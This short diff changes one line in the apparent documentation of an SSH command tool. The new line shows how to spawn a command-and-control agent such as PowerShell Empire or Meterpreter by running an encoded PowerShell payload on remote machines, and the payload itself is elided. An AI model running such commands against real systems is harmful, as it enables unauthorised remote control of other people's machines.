@@ -48,7 +48,7 @@ ___
   
 Spawn another C2 agent (Powershell-Empire, Meterpreter, etc):
 
-`python3 asyncssh_commander.py "powershell -e ABJe...dhYte"`
+`python3 asyncssh_commander.py "powershell.exe -e ABJe...dhYte"`
   
 ___    
   
